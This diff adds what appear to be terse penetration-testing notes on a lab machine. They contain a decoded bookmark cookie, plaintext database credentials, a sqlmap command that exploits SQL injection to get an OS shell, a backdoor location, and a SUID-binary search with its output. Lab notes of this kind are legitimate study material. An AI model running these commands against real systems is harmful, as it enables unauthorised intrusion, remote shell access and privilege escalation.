@@ -1,0 +1,35 @@
+eyIxIjp7IklEIjoxLCJuYW1lIjoiTXkgaWNvbnMgY29sbGVjdGlvbiIsImJvb2ttYXJrX2lkIjoiZHpvejQ5Z2pvNjAwMDAwMCIsImNyZWF0ZWQiOm51bGwsInVwZGF0ZWQiOjE1MTUyOTkwMDgsImFjdGl2ZSI6MSwic291cmNlIjoibG9jYWwiLCJvcmRlciI6MCwiY29sb3IiOiIwMDAwMDAiLCJzdGF0dXMiOjF9LCJkem96NDlnam82MDAwMDAwIjpbeyJpZCI6NDUyODE0LCJ0ZWFtIjowLCJuYW1lIjoiY2FyIiwiY29sb3IiOiIjMDAwMDAwIiwicHJlbWl1bSI6MCwic29ydCI6M30seyJpZCI6NjY5OTQzLCJ0ZWFtIjowLCJuYW1lIjoiaGVyYnMiLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0IjoyfSx7ImlkIjo1OTk5NTYsInRlYW0iOjAsIm5hbWUiOiJjaGVlcnMiLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0Ijo0fSx7ImlkIjoyNTk5NTAsInRlYW0iOjAsIm5hbWUiOiJyZWNlcHRpb24iLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0IjoxfV19
+
+turns out =>
+{"1":{"ID":1,"name":"My icons collection","bookmark_id":"dzoz49gjo6000000","created":null,"updated":1515299008,"active":1,"source":"local","order":0,"color":"000000","status":1},"dzoz49gjo6000000":[{"id":452814,"team":0,"name":"car","color":"#000000","premium":0,"sort":3},{"id":669943,"team":0,"name":"herbs","color":"#000000","premium":0,"sort":2},{"id":599956,"team":0,"name":"cheers","color":"#000000","premium":0,"sort":4},{"id":259950,"team":0,"name":"reception","color":"#000000","premium":0,"sort":1}]}
+
+
+
+db username : DBadmin
+db password " imissyou
+
+
+sqlmap -u http://10.10.10.143/room.php?cod=-1 -D 'hotel' --os-shell
+-> got shell
+
+
+backdoor path : /var/www/html/
+
+
+SUID:
+find / -perm -u=s -type f 2>/dev/null
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/systemctl
+/bin/umount
+/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
